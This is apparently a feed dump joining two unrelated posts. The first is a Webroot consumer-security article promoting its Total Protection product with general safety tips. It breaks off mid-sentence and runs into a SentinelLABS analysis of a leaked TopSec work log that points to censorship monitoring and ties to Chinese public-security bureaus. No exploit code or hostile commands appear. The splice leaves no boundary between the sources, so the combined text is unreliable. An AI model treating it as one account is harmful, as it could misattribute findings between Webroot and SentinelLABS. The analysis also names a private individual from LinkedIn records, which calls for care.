&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/21/is-your-whole-digital-life-protected-4-ways-to-address-common-vulnerabilities/" rel="nofollow"&gt;Is your whole digital life protected? 4 ways to address common vulnerabilities&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Cyber threats. Identity theft. Online profiling. Financial fraud. Social media misuse. The list just gets longer. As more aspects of our lives move online and digital devices proliferate, staying safe from threats has become more important than ever.&lt;/p&gt;



&lt;p&gt;Consider all the connected devices you use for daily tasks—browsing, shopping, banking, gaming, and more. Then think about all the content that you share on these devices every day; much of it likely contains sensitive or critical information that, in the wrong hands, could lead to serious damage with long-lasting impact.&lt;/p&gt;



&lt;p&gt;The solution? Comprehensive digital protection. Webroot Total Protection is the latest release in our Customer Digital Life Protection strategy that checks all the boxes. It’s a top-end, true all-in-one offering based on a new platform that combines antivirus, password manager, identity protection, VPN, backup, and parental controls.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. Protect your devices from viruses&lt;/h2&gt;



&lt;p&gt;How confident are you that your digital music, photos, and important documents—as well as email and applications—are safe? Cybercriminals are constantly developing new &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-malware-protection"&gt;malware&lt;/a&gt;, &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-ransomware"&gt;ransomware&lt;/a&gt;, and phishing attacks that can steal identities, encrypt memorable family photos and documents for ransom, and turn home computers into devices that criminals take over to send spam or steal data.&lt;/p&gt;



&lt;p&gt;Effective security software shields you from worms, trojans, &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-adware"&gt;adware&lt;/a&gt;, and more. And it protects not just your PC and laptop, but also your tablets, smartphones, and other digital devices.&lt;/p&gt;



&lt;p&gt;Comprehensive antivirus software is most effective when used in conjunction with security best practices. Here are a few:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Make sure your antivirus software performs scans regularly&lt;/li&gt;



&lt;li&gt;Install the latest security patches for your operating systems&lt;/li&gt;



&lt;li&gt;Keep your antivirus software up to date&lt;/li&gt;



&lt;li&gt;Be careful when downloading new apps onto devices; only download from app stores you trust&lt;/li&gt;



&lt;li&gt;Regularly backup important data&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2025/01/28122833/Webroot_blog_total-protection.jpg"&gt;&lt;img alt="Color illustration showing how Webroot antivirus protects devices." class="wp-image-33635" height="563" src="https://blog-en.webroot.com/wp-content/uploads/2025/01/28122833/Webroot_blog_total-protection.jpg" width="1000" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;br /&gt;2. Protect your privacy in your online activities&lt;/h2&gt;



&lt;p&gt;Sharing information has become commonplace in our digital lives. From purchasing a plane ticket to opening a bank account and registering to vote, or simply doing your grocery shopping online, getting through the day without sharing at least some &lt;a href="https://www.webroot.com/in/en/resources/glossary/what-is-personally-identifiable-information"&gt;personal information&lt;/a&gt; online seems nearly impossible.&lt;/p&gt;



&lt;p&gt;The flip side to this convenience, however, is that we risk losing control over who can access our personal information. Malicious actors are constantly seeking to collect personal data to commit fraud, steal identities, harass and threaten individuals, and more.&lt;/p&gt;



&lt;p&gt;Protecting privacy is a top priority for families facing growing threats. &lt;a href="https://www.webroot.com/blog/2017/09/01/password-manager/"&gt;&lt;strong&gt;Password managers&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; &lt;/strong&gt;generate strong, unique passwords and simplify their use, protecting you and saving time by automatically filling in credentials for website and app logins. Besides, using a &lt;strong&gt;&lt;a href="https://www.webroot.com/blog/2024/11/21/do-you-actually-need-a-vpn-your-guide-to-staying-safe-online/"&gt;VPN (Virtual Private Network)&lt;/a&gt;&lt;/strong&gt; that establishes secure connections to public Wi-Fi hotspots by encrypting data transmission will keep you safe and anonymous when you’re away from home.&lt;/p&gt;



&lt;p&gt;By paying attention to your device settings you can take steps to protect your privacy across your digital life:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Social media: &lt;/strong&gt;Choose who can see your posts, photos, and personal information and review these settings regularly. Set your default sharing settings to &amp;#8220;friends&amp;#8221; or a more restricted group rather than &amp;#8220;public.&amp;#8221; Check which third-party apps have access to your account and remove those you no longer use.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Mobile devices: &lt;/strong&gt;Disable location, camera, microphone, and contact list access for apps that don&amp;#8217;t truly need them. Consider turning off location services when not needed and review which apps track your location in the background.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Web browsers: &lt;/strong&gt;Clear your browsing history and cookies regularly, block third-party cookies, and enable &amp;#8220;do not track&amp;#8221; features. Review and manage which sites can send you notifications, access your location, or use your camera/microphone.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Smart home devices: &lt;/strong&gt;Review privacy settings for voice assistants like Alexa or Google Home regularly. Check what data these devices collect and adjust accordingly.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Email services: &lt;/strong&gt;Keep tabs on apps and services that have access to your email account. Adjust spam filter settings to your preferences.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Operating systems:&lt;/strong&gt; Check your privacy settings to control app permissions, data access, and tracking features.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;3. Safeguard your identity and private information&lt;/h2&gt;



&lt;p&gt;Once only seen in spy movies, identity theft today is very real, and poses serious financial, legal, and personal consequences. Bad actors can drain your bank accounts, open fraudulent credit cards, take out loans, file false tax returns, obtain medical services in your name, and more. The results range from damaged credit and mounting debt to inaccurate medical records and reputation damage.&lt;/p&gt;



&lt;p&gt;Some steps you can take to protect your identity include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Monitoring financial activity: &lt;/strong&gt;Check bank and credit card statements each month for unauthorized charges. Set up alerts for unusual transactions and review your credit reports.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Securing personal information: &lt;/strong&gt;Only share Social Security numbers, birth dates, or account numbers when absolutely necessary. Shred or securely dispose of documents containing sensitive information and keep important documents in a secure location.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Be wary of scams: &lt;/strong&gt;You shouldn’t respond to unsolicited phone calls, emails, or texts requesting personal information—legitimate organizations typically won&amp;#8217;t ask for sensitive details through these channels.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Consider additional protection: &lt;/strong&gt;Identity theft protection services monitor your credit and personal information for suspicious activity and alert you to anomalies. Many will also reimburse up to $1 million for fraud expenses, stolen funds, and related costs such as lawyer and expert fees, lost wages, private investigator charges, and additional childcare or eldercare. They can also help you re-establish your identity—on average it takes 200 hours to restore an identity after fraud.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;How does an identity protection plan work?&lt;/p&gt;



&lt;p&gt;Usually such services include a secure online portal where you can register your personal data, like date of birth, driver’s license, SSN, account numbers, and more. Once you subscribe, make sure to take the time to create your profile and that of your family members, so you can start getting identity health reports and rapid alerts right away in case anything fraudulent is detected!&lt;/p&gt;



&lt;p&gt;If identity theft does happen, freeze any accounts with fraudulent charges and establish a fraud alert with credit bureaus. You can file an official identity theft report with the Federal Trade Commission at &lt;a href="https://www.identitytheft.gov/"&gt;IdentityTheft.gov.&lt;/a&gt; Contact relevant organizations, such as the Social Security Administration if your SSN was stolen. Close compromised accounts and open new ones with different account numbers, and new passwords and PINs.&lt;/p&gt;



&lt;p&gt;If you think the process of restoring your identity after theft is daunting, rest assure that cybersecurity or insurance companies offer identity protection plans that include the help of a remediation expert, who can guide you through the process. These professionals have in-depth knowledge of identity theft laws, credit reporting procedures, fraud resolution practices, and how to interact with various institutions to resolve issues effectively.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Protect the data, document and precious memories stored on your devices&lt;/h2&gt;



&lt;p&gt;Theft isn’t the only threat to data – consider the impact that hardware failures, coffee spills, and accidental deletions can have on favorite photos, digital memories, and other unreplaceable items. This is where &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-encryption"&gt;data encryption&lt;/a&gt; and automated backups come in.&lt;/p&gt;



&lt;p&gt;Data encryption protects data by translating it into a different, unreadable form using an encryption key. When it’s in that encrypted form, only someone with the unique decryption key or password can translate the data back into its readable state. Encryption is one of the most effective and widely used forms of data security available.&lt;/p&gt;



&lt;p&gt;With automated backup you can create a backup schedule that you can set and forget. Back-up files are typically uploaded to the cloud so they are accessible from anywhere. Changes that you make on your files are reflected in the backup ones.&lt;/p&gt;



&lt;p&gt;Data protection best practices include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Follow the 3-2-1 backup rule: three copies of data, on two different types of media, with one copy off-site&lt;/li&gt;



&lt;li&gt;Test restore procedures regularly&lt;/li&gt;



&lt;li&gt;Keep encryption keys and passwords secure but accessible&lt;/li&gt;



&lt;li&gt;Monitor backup logs and storage capacity&lt;/li&gt;



&lt;li&gt;Regularly update backup software for security patches&lt;/li&gt;
&lt;/ul&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;You may already be protected in one or several of these areas,&lt;/strong&gt; &lt;br /&gt;&lt;strong&gt;but how could you make sure you truly have comprehensive protection?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Introducing Webroot Total Protection&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;With the mounting threats out there, it’s time to consider comprehensive digital protection so you can rest easy that your devices are safe and your content, identity, and privacy are protected.

&lt;ul&gt;
&lt;li&gt;SentinelLABS has analyzed a data leak containing infrastructure details and work logs from employees of a state-affiliated private sector security firm in China.&lt;/li&gt;
&lt;li&gt;The leaked data contains references to web content monitoring services used to enforce censorship for public and private sector customers.&lt;/li&gt;
&lt;li&gt;Work logs reveal that the firm provided bespoke monitoring services to a state-owned enterprise when a corruption scandal impacted this organization, providing insights into how the state and CCP coordinate with some cybersecurity companies to manage fallout from corruption scandals.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;SentinelLABS has analyzed a data leak from TopSec (北京天融), a Chinese cybersecurity firm offering services such as Endpoint Detection &amp;amp; Response (EDR) and vulnerability scanning, while offering boutique solutions to align with government initiatives and intelligence requirements.&lt;/p&gt;
&lt;p&gt;The data leak includes a document with 7,000+ lines of work logs and code used to orchestrate infrastructure for the firm’s DevOps practices and downstream customers and includes scripts that connect to several Chinese government hostnames, academic institutions and news sites.&lt;/p&gt;
&lt;p&gt;We identified work logs and system features that indicate TopSec is likely enabling content moderation for internet censorship purposes, a key &lt;a href="https://www.atlanticcouncil.org/in-depth-research-reports/report/community-watch-chinas-vision-for-the-future-of-the-internet/"&gt;strategy&lt;/a&gt; used by the Chinese Communist Party (CCP) to monitor and control public opinion on issues that the state deems contentious or antisocial.&lt;/p&gt;
&lt;p&gt;Further, we found evidence indicating that TopSec provided bespoke services to a state-owned enterprise on the date that a corruption investigation was announced targeting the organization’s top official.&lt;/p&gt;
&lt;p&gt;The Chinese cybersecurity market has long been a mystery for many researchers in the west. Unlike Europe and parts of the Middle East, which foster some degree of collaboration, the Chinese cybersecurity market is obscured behind the wall that divides China from the global internet. This finding reveals not only the types of technologies that are used by a prestigious Chinese tech firm, but how they are providing security services to private and public sector customers inside China.&lt;/p&gt;
&lt;h2&gt;TopSec&lt;/h2&gt;
&lt;p&gt;TopSec is a provider of monitoring and IT security solutions, as well as big data and cloud services. Established in 1995, TopSec prides itself on its long history and prioritizes national cyberspace security as a core element of its mission statement.&lt;/p&gt;
&lt;p&gt;Company registration details reveal that TopSec holds over 1,000 patents, 87 software copyrights, and has 12 subsidiaries. The company is also a &lt;a href="https://www.atlanticcouncil.org/in-depth-research-reports/report/sleight-of-hand-how-china-weaponizes-software-vulnerability/"&gt;Tier 1 vulnerability supplier&lt;/a&gt; to China’s civilian intelligence ministry. According to TopSec&amp;#8217;s 2024 annual corporate report for shareholders, the company has been offering cloud monitoring services–including IT security monitoring capabilities–since 2004. By 2020, these TopSec services were in use across all 31 of China’s administrative regions.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114591" height="683" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4.jpg" width="1999" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114600" style="width: 782px;"&gt;&lt;img alt="TopSec&amp;#039;s 2024 annual corporate report" class="size-full wp-image-114600" height="266" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12.jpg" width="782" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114600"&gt;TopSec&amp;#8217;s 2024 annual corporate report (&lt;a href="https://file.finance.sina.com.cn/211.154.219.97:9494/MRGG/CNSESZ_STOCK/2024/2024-4/2024-04-20/10013439.PDF" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The leaked documents we analyzed reference multiple organizations in both the private and public sectors, likely customers or otherwise associated with TopSec, a selection of which is listed below. These references include probable deployment sites of monitoring probes and mentions in-work progress records.&lt;/p&gt;
&lt;p&gt;Public sector organizations referenced in the documents include entities integral to China’s political system, such as the Municipal Commissions for Discipline Inspection, which enforce party regulations and investigate corruption. Another example is the Illegal and Harmful Information Reporting Center, an entity dedicated to combating what the Chinese Communist Party (CCP) considers illegal and harmful behavior in the online space. TopSec customers referenced in these documents include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dongwu Fund Management Co., Ltd&lt;/li&gt;
&lt;li&gt;Gucheng County Petition Bureau&lt;/li&gt;
&lt;li&gt;Illegal and Harmful Information Reporting Center&lt;/li&gt;
&lt;li&gt;Linhai Rural Commercial Bank&lt;/li&gt;
&lt;li&gt;Petkit&lt;/li&gt;
&lt;li&gt;Shanghai Diepai Automobile Technology Co&lt;/li&gt;
&lt;li&gt;Shanghai Fengyilong Electronic&lt;/li&gt;
&lt;li&gt;Shanghai Medical Packaging Materials Factory&lt;/li&gt;
&lt;li&gt;Shanghai Municipal Commission for Discipline Inspection&lt;/li&gt;
&lt;li&gt;Shanghai Municipal Supervisory Commission&lt;/li&gt;
&lt;li&gt;Tibet Autonomous Region&lt;/li&gt;
&lt;li&gt;Tibet Autonomous Region Committee of the Communist Party of China&lt;/li&gt;
&lt;li&gt;Wuhu Discipline Inspection and Supervision Network&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We observed references to three projects associated with Bureaus of the Ministry of Public Security in the northeastern city of Dandong, as well as the Songjiang and Pudong districts of Shanghai, with the latter project referred to as the &amp;#8220;Cloud Monitoring Service Project&amp;#8221;. The Ministry of Public Security is responsible for maintaining public order and overseeing law enforcement and surveillance activities to ensure compliance with national regulations.&lt;/p&gt;
&lt;pre&gt;
[2024-2025 Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project (Phase II)]
The statistics of events that occurred today are as follows:
Aggregated events: 883 Valid: 129 Invalid: 672 On-hand: 82
Single events: 5637 Valid: 187 Invalid: 2781 On-hand: 2669
In terms of event volume, it is basically the same as that of our competitors.
&lt;/pre&gt;
&lt;p&gt;A public procurement announcement for the &amp;#8220;Cloud Monitoring Service Project&amp;#8221; suggests that it involves monitoring the security posture and content of websites under the Bureaus&amp;#8217; jurisdiction, with alerts issued in case of security breaches or policy violations. TopSec was likely involved in the bidding process alongside competitor companies. Public documents, however, show TopSec did not win the contract.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114586" style="width: 1999px;"&gt;&lt;img alt="Contract Announcement of Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project" class="size-full wp-image-114586" height="980" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114586"&gt;Contract announcement  for Cloud Monitoring Service Project (&lt;a href="https://www.zfcg.sh.gov.cn/luban/detail?parentId=137027&amp;amp;articleId=yuZoUGZxSiBaeduhBehxXA==" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114587" style="width: 1999px;"&gt;&lt;img alt="Procurement announcement for Cloud Monitoring Service Project" class="size-full wp-image-114587" height="1174" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114587"&gt;Procurement announcement for Cloud Monitoring Service Project (&lt;a href="https://www.shexgrp.com/jyzx/001001/001001004/001001004001/20240729/7979111.html" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Infrastructure Features&lt;/h2&gt;
&lt;p&gt;We identified this leak as a submission to a multi-scanner platform that fired off a rule that looks for common abuse activities associated with Kubernetes. The main file we analyzed (SHA-1: &lt;code&gt;1bccef07ad0348e326248fe321259e2bd8f8cf8b&lt;/code&gt;) contains numerous work logs, which are a description of the work performed by a TopSec employee and the amount of time the task took, often accompanied by scripts, commands, or data related to the task.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114590" style="width: 755px;"&gt;&lt;img alt="Example of work logs from the file along with English translation" class="size-full wp-image-114590" height="154" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_5.jpg" width="755" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114590"&gt;Example of work logs from the file along with English translation&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;In addition to work logs, the leak contains many commands and playbooks used to administrate TopSec’s services via multiple common DevOps and infrastructure technologies that are used worldwide, including Ansible, Docker, ElasticSearch, Gitlab, Kafka, Kibana, Kubernetes, and Redis. There are many artifacts showing JSON data for web APIs used by TopSec services. There are also network configurations, SSH and port mapping commands with hardcoded credentials, which present a huge security risk should anyone obtain access to the environment–and would likely provide access to TopSec’s downstream customers as well.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114598" style="width: 686px;"&gt;&lt;img alt="Ansible commands from leaked file used to access infrastructure" class="size-full wp-image-114598" height="190" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14.jpg" width="686" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114598"&gt;Ansible commands from leaked file used to access infrastructure&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The leaked file is very large, disorganized, and the formatting is inconsistent, which complicates analysis. It is highly likely that we have not identified all capabilities outlined in the leak. Our analysis approach focused on translating the Chinese language content, identifying known technologies, and identifying interesting references in the commands and API JSON artifacts, particularly those where there were upticks in work logs performed around specific dates documented in the work logs or web API data.&lt;/p&gt;
&lt;p&gt;The data leak includes a file that starts with infrastructure management code, including some which initializes several Docker images to enable security monitoring related features. These containers run probes, which are likely used for network monitoring. We are unable to fully assess the capabilities of these containers without access to them. However, the containers are run with several flags such as &lt;code&gt;--privileged&lt;/code&gt; and &lt;code&gt;--net host&lt;/code&gt; that suggest deep access to the monitored data. This may indicate the probes inspect network traffic or perform privileged tasks in the deployment environment.&lt;/p&gt;
&lt;p&gt;Deeper in the file, there are work logs which contain dates indicating when certain tasks were performed and notes from the TopSec staff who worked on specific infrastructure projects. One project referenced repeatedly is called Sparta or Sparda, with the spelling changing regularly. Notes from the TopSec staff indicate that Sparta handles sensitive word processing, an indication of censorship keyword monitoring.&lt;/p&gt;
&lt;p&gt;On a technical level, Sparta is a framework that uses GraphQL APIs to receive content from downstream web applications. Work logs indicate that TopSec migrated from a system called Apollo, which is plausibly a reference to &lt;a href="https://github.com/apollographql"&gt;Apollo-GraphQL&lt;/a&gt;, an open-source framework offered by a company based in San Francisco. The work logs also indicate that Sparta is equipped to process Chinese language characters. This suggests that TopSec likely developed Sparta as an in-house solution that is tailored to the localized needs of TopSec’s customers and does not rely on a US-based solution.&lt;/p&gt;
&lt;p&gt;Additionally, we observed a note indicating that detection alerts considered severe are likely distributed to internal teams via WeChat for prioritized handling. WeChat is a widely-used messaging and social media platform in China, known for its broad range of features, including messaging, social networking, and payment services. Its integration into daily life makes it an essential tool for communication and business operations within the country.&lt;/p&gt;
&lt;pre&gt;
Severe monitoring events are sent to corporate WeChat
&lt;/pre&gt;
&lt;p&gt;Since WeChat operates under Chinese regulations, there are significant implications regarding data privacy and government access. Under Chinese laws, such as the &lt;a href="https://digichina.stanford.edu/work/translation-cybersecurity-law-of-the-peoples-republic-of-china-effective-june-1-2017/"&gt;Cybersecurity Law&lt;/a&gt;, companies like Tencent, which owns WeChat, are required to cooperate with government entities, allowing them to access data when requested.&lt;/p&gt;
&lt;h2&gt;Web Content Monitoring&lt;/h2&gt;
&lt;p&gt;Our analysis found that TopSec’s capabilities include web content monitoring, as indicated by references to a service called &lt;code&gt;Website Monitoring Service&lt;/code&gt; and detection events with internal identifiers prefixed with &lt;code&gt;Web&lt;/code&gt;, such as &lt;code&gt;WebTamper&lt;/code&gt;, &lt;code&gt;WebHiddenLink&lt;/code&gt;, &lt;code&gt;WebAvailHttp&lt;/code&gt;, &lt;code&gt;WebDns&lt;/code&gt;, &lt;code&gt;WebTr&lt;/code&gt;, and &lt;code&gt;WebSensitive&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This feature of the platform is likely part of what would have been proposed in response to the bid issued by the Shanghai Pudong Bureau for the &amp;#8220;Cloud Monitoring Service Project&amp;#8221;, offering the Bureau tools to monitor website security and content as part of their broader surveillance and compliance efforts.&lt;/p&gt;
&lt;pre&gt;

[2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553] 2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553
WebSensitive 56
WebTamper 149
WebHiddenLink 348
&lt;/pre&gt;
&lt;p&gt;While the exact logic behind how the Web events are triggered remains unclear, the event names and metadata present in the documents provide insight into the purpose of some of these events. For instance, the &lt;code&gt;WebAvailHttp&lt;/code&gt; event is likely triggered when a website is considered unavailable due to its response time (measured in milliseconds as &lt;code&gt;respTimeMs&lt;/code&gt; in the figure below) exceeding a predefined threshold (&lt;code&gt;respThresholdMs&lt;/code&gt;).&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114595" style="width: 330px;"&gt;&lt;img alt="Metadata on the WebAvailHttp event" class="size-full wp-image-114595" height="357" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17.jpg" width="330" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114595"&gt;Metadata on the &lt;em&gt;WebAvailHttp&lt;/em&gt; event&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Further, the &lt;code&gt;WebHiddenLink&lt;/code&gt; event is likely triggered when web content contains hidden links — links that obscure their destination or mislead users, posing a security risk. Examples include links concealed within small or transparent elements, deceptive anchor text, and styling tricks that make links appear as plain text.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114601" style="width: 423px;"&gt;&lt;img alt="The WebHiddenLink event" class="size-full wp-image-114601" height="92" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_11.jpg" width="423" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114601"&gt;The &lt;em&gt;WebHiddenLink&lt;/em&gt; event&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Web Content Monitoring | Sensitive Words&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;WebSensitive&lt;/code&gt; event is likely triggered when web content contains so-called &lt;a href="https://www.sciencedirect.com/science/article/abs/pii/S2211695822000897"&gt;sensitive words&lt;/a&gt; (敏感词 in Simplified Chinese). These words are related to political criticism, violence, or pornography, and are central to China&amp;#8217;s domestic Internet censorship efforts aimed at ensuring compliance with government policies. Detecting the presence of such words in web content helps prevent the dissemination of information considered inappropriate or harmful by PRC authorities.&lt;/p&gt;
&lt;pre&gt;
Assist the product to check for missed scans and manual analysis and marking errors of sensitive word events
&lt;/pre&gt;
&lt;p&gt;TopSec’s ability to detect sensitive words demonstrates the impact that state policies related to the cyber domain have on the design and implementation of monitoring solutions developed by the private sector in China. These policies shape the strategies and technologies used to monitor, filter, and control online content, ensuring that IT systems comply with governmental regulations and censorship guidelines.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WebSensitive&lt;/code&gt; alerts may be used by private sector organizations to monitor user-generated content on their websites in order to trigger actions such as issuing warnings, deleting content, or restricting access when sensitive words are detected. Government entities may also consume these alerts to track the presence of sensitive words on their own websites or across broader online spaces to enforce compliance with national censorship regulations. For example, the latter may have been an objective of the previously mentioned &amp;#8220;Cloud Monitoring Service Project&amp;#8221; by the Shanghai Pudong Bureau of the Ministry of Public Security.&lt;/p&gt;
&lt;p&gt;We observed a task list indicating a focused effort to ensure consistent monitoring for sensitive words between 7:00 AM and 8:00 AM on the 14th (converted from GMT to China Standard Time), with the month and year not specified. The preceding document content suggests that the reference is to September 2023. One item in the task list instructs verification of the availability and capacity of sensitive word detection capabilities during this period, while another item records the forwarding of &amp;#8216;asset identifiers&amp;#8217; for collected &amp;#8216;validated events&amp;#8217; to an individual named Zhao Nannan (赵楠楠). The task list issuing this instruction very likely includes a typo stating the validated events were from 7:00 AM to 10:00 PM on September 14.&lt;/p&gt;
&lt;pre&gt;
1. 	Plan the probe deployment plan for the web split emergency milestone launch 3h
2. 	Check the number of agents for sensitive words between 23:00 on the 13th (GMT) and 14:00 at 00:00 (排查敏感词13日23点到14点0点之间的代办数量) 2h
3. 	Check cloud baseline 500 errors 1h
4. 	Collect asset identifiers of valid events on the 13th and provide them to Zhao Nannan 1h
5. 	Check the task execution failure of ipv6 probe 1h
&lt;/pre&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114594" style="width: 379px;"&gt;&lt;img alt="Document excerpts indicating sensitive web content actions in September 2023" class="size-full wp-image-114594" height="276" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_18.jpg" width="379" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114594"&gt;Document excerpts indicating sensitive web content actions in September 2023&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The identification of an individual named Zhao Nannan as the likely recipient of this information, alongside the context of the monitoring effort, leads us to conclude with moderate confidence that this effort was in response to political events in Shanghai.&lt;/p&gt;
&lt;p&gt;We identified a woman named Zhao Nannan as having worked at the 3rd Bureau of the Ministry of Public Security in Shanghai, which is &lt;a href="https://web.archive.org/web/20240622033538/https://www.trimps.ac.cn/gass/index.html"&gt;responsible&lt;/a&gt; for network security and technical investigations. Our observations presented earlier in this post suggest close ties between Shanghai-based Bureaus of the Ministry of Public Security and TopSec, one example being TopSec&amp;#8217;s participation in a project bidding process launched by the Shanghai Pudong Bureau.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114596" height="328" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16.jpg" width="1442" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114593" style="width: 1388px;"&gt;&lt;img alt="Employment affiliation of Zhao Nannan" class="size-full wp-image-114593" height="376" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2.jpg" width="1388" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114593"&gt;Employment affiliation of Zhao Nannan (Source: LinkedIn)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;However, Zhao Nannan no longer works for the MPS 3rd Bureau in Shanghai. According to an online announcement from the Shanghai State-owned Assets Supervision and Administration Commission (SASAC), Zhao Nannan was one of six successful applicants to SASAC for a network security role. The announcement even references her past role at the MPS 3rd Bureau. Congratulations are due to her, as she scored the highest among the applicants for the role–恭喜!&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114597" height="624" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15.jpg" width="1999" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114589" style="width: 1999px;"&gt;&lt;img alt="Zhao Nannan’s role at Shanghai SASAC" class="size-full wp-image-114589" height="624" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114589"&gt;Zhao Nannan’s role at Shanghai SASA (&lt;a href="https://perma.cc/65UL-57DP" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;On the morning of September 14th, when Zhao Nannan received alerts for sensitive content, her new employer announced on its WeChat account that the head of the Shanghai SASAC, Bai Tinghui, was under investigation for corruption. The news was quickly picked up by the South China Morning Post, Caixing, and other news-reposting blogs in China. The Shanghai government itself confirmed the investigation into Bai Tinghui and his subsequent dismissal one month later.&lt;/p&gt;

&lt;p&gt;Because the Shanghai SASAC posted the news on WeChat, we know that the investigation itself was not subject to censorship. The lack of complete censorship regarding the investigation raises questions about what “validated events” would have been reported to Zhao Nannan following the announcement.&lt;/p&gt;
&lt;p&gt;Currently, only five webpages of the Shanghai SASAC still mention Bai Tinghui. All five pages also mention Bai leading a Party study session of Xi Jinping Thought. It’s unclear why only these pages of Bai Tinghui remain–perhaps his tarnished reputation is outshown by Xi Jinping: it may be hard to delete a website with Xi Jinping’s name on it, even if it is accompanied by a corrupt local official.&lt;/p&gt;
